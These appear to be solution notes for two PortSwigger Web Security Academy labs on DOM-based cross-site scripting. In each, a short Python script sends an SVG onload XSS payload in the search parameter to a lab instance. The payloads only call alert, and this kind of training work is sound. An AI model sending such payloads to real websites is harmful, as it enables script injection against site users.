# Portswigger

## XSS

### [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)

#### Lab: DOM XSS in `document.write` sink using source `location.search`

_This lab contains a_ [_DOM-based cross-site scripting_](https://portswigger.net/web-security/cross-site-scripting/dom-based) _vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL._

_To solve this lab, perform a_ [_cross-site scripting_](https://portswigger.net/web-security/cross-site-scripting) _attack that calls the `alert` function_

```python
import requests

url = "https://0a1e0067044d34a8c2a44bb8000700ed.web-security-academy.net"

session = requests.Session()

params = {
    "search" : f'"><svg/onload=alert(1)>'
}
r = session.get(url = url , params= params)

if "Congratulations, you solved the lab!" in r.text:
    print("solved")
```

#### Lab: DOM XSS in `innerHTML` sink using source `location.search`

_This lab contains a_ [_DOM-based cross-site scripting_](https://portswigger.net/web-security/cross-site-scripting/dom-based) _vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`._

_To solve this lab, perform a_ [_cross-site scripting_](https://portswigger.net/web-security/cross-site-scripting) _attack that calls the `alert` function._

```python
import requests

url = "https://0a9900f9047f2860c1167170009f00d1.web-security-academy.net/"

session = requests.Session()

params = {
    "search" : f'<svg/onload=alert(1)>'
}
r = session.get(url = url , params= params)

if "Congratulations, you solved the lab!" in r.text:
    print("solved")
```
